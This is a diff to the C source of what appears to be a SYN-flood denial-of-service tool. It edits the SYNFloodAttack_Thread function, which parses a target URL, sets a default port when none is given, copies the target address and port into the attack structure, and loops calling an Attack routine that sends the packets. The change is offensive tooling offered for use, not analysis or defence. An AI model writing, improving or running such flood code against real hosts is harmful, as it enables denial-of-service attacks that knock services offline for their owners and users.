@@ -209,18 +209,27 @@ int SYNFloodAttack_Thread(pInput input)
     extern int GetRandomPort(int *output);
 
     pSYNStruct s = (pSYNStruct)malloc(sizeof(SYNStruct));
-    pSplitURLOutput o;
+    pSplitURLOutput split_result;
 
     DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "ATTACK!");
-    if (SplitURL(input->address, &o) == -1)
+    if (!SplitURL(input->address, &split_result))
     {
         DisplayError("SYNFloodAttack_Thread SplitURL failed");
         return 1;
     }
-    if (strlen(o->host) == 0 || o->port == 0)
+    DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %s", split_result->protocol);
+    DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %s", split_result->host);
+    DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %d", split_result->port);
+    DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "split_reult: %s", split_result->suffix);
+    if (split_result->port == 0)
     {
-        DisplayError("SYNFloodAttack_Thread SplitURL not right");
-        return 1;
+        if (strlen(split_result->host) == 0)
+        {
+            DisplayError("SYNFloodAttack_Thread SplitURL not right");
+            return 1;
+        }
+        // make the port as default
+        split_result->port = SYN_FLOOD_PORT_DEFAULT;
     }
     // init the target ip and port
     s->dst_ip = (char *)malloc(SYN_FLOOD_IP_BUFFER_SIZE);
@@ -234,13 +243,13 @@ int SYNFloodAttack_Thread(pInput input)
         DisplayError("SYNFloodAttack_Thread memset failed, %s", strerror(errno));
         return 1;
     }
-    if (!strncpy(s->dst_ip, o->host, strlen(o->host)))
+    if (!strncpy(s->dst_ip, split_result->host, strlen(split_result->host)))
     {
         DisplayError("SYNFloodAttack_Thread strncpy failed, %s", strerror(errno));
         return 1;
     }
-    s->dst_port = o->port;
-    FreeSplitURLBuff(o);
+    s->dst_port = split_result->port;
+    FreeSplitURLBuff(split_result);
     s->loop = input->each_ip_repeat;
 
     DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "SYNFloodAttack_Thread start sending data...");
@@ -269,7 +278,7 @@ int SYNFloodAttack_Thread(pInput input)
         }
 
         // rport is random source port
-        if (Attack(s, input->debug_level) == -1)
+        if (Attack(s, input->debug_level))
         {
             DisplayError("SYNFloodAttack_Thread Attack failed");
             return 1;
